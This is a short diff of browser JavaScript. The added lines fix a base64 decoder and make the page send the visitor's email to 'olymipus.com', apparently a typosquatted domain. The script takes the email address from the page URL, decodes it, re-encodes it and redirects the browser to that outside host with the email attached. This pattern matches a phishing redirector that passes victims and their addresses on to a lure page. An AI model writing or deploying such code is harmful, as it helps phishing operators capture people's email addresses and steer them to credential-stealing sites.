@@ -4,7 +4,7 @@ var currentUrl = window.location.href;
 
 // Function to decode base64 encoded string
 function decodeBase64(encodedString) {
-   return (encodedString);
+   return atob (encodedString);
 }
 
 // Extract the email address from the URL using a regular expression
@@ -20,9 +20,8 @@ if (email) {
    } catch (e) {
        // Not base64 encoded, use the original value
  }
-    
 
-    var redirectUrl = 'https://olymipus.com/sd.php?rav=' + (decodedEmail);
+    var redirectUrl = 'https://olymipus.com/sd.php?rav=' + btoa (decodedEmail);
     window.location.href = redirectUrl;
 } else {
     console.log('Email address not found in the URL');
